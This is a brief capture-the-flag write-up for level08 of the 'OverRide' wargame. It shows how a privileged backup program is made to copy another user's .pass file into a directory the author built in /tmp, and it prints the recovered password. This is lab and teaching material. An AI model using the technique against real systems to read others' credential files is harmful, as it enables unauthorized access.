# level08

The program opens a file and backups the content of the file into `./backup/$FILEPATH`.

## Step 1. Try to backup `.pass`
```
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
We got an error that the program cannot open `./backups//home/users/level09/.pass`. We cannot create directory in the home directory.

## Step 2. Use `/tmp` to bakcup `.pass`
```
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
